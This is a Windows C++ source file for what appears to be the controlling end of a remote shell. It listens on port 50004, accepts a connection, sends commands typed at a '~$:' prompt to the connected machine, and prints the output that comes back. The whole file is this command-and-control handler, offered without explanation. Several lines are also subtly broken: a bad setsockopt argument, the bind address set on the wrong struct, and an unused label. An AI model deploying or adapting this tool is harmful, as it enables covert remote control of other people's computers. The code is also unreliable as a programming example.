#ifndef WIN32
#define WIN32
#endif

#ifndef _WINDOWS_
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#undef WIN32_LEAN_AND_MEAN
#endif // !_WINDOWS_

#include <WinSock2.h>

#pragma comment(lib, "ws2_32.lib")
#include <stdio.h>
#include <stdlib.h>
#include <WS2tcpip.h>
#include <string>
#include <io.h>

INT main() {
	int iSock, iSock_Client;
	char buffer[1024];
	char cResp[18384];
	struct sockaddr_in sAddress, cAddress;
	int n = 0;
	int value = 1;
	socklen_t cLen;

	iSock = socket(AF_INET, SOCK_STREAM, NULL);

	if (setsockopt(iSock, SOL_SOCKET, SO_REUSEADDR, (char*)value, sizeof(value)) < 0) {
		printf("%s\n", "cannot set socket settings");
		return TRUE;
	}

	sAddress.sin_family = AF_INET;
	cAddress.sin_addr.s_addr = inet_addr("127.0.0.1");
	sAddress.sin_port = htons(50004);

	if (bind(iSock, (struct sockaddr*)&sAddress, sizeof(sAddress)) != 0) {
		printf("%s\n", "failed to produce port bind");
		return TRUE;
	}
	listen(iSock, 5);
	cLen = sizeof(cAddress);
	iSock_Client = accept(iSock, (struct sockaddr*)&cAddress, &cLen);

	while (1) {
	jmp:
		RtlZeroMemory(buffer, sizeof(buffer));
		RtlZeroMemory(cResp, sizeof(cResp));
		printf("%s~$: ", inet_ntoa(cAddress.sin_addr));

		fgets(buffer, sizeof(buffer), (stdin));
		strtok(buffer, "\n");
		_write(iSock_Client, buffer, sizeof(buffer));
		if (strncmp("q", buffer, 1) == 0) {
			break;
		}
		else {
			recv(iSock_Client, cResp, sizeof(cResp), MSG_WAITALL);
			printf("%s\n", cResp);
		}
	}
}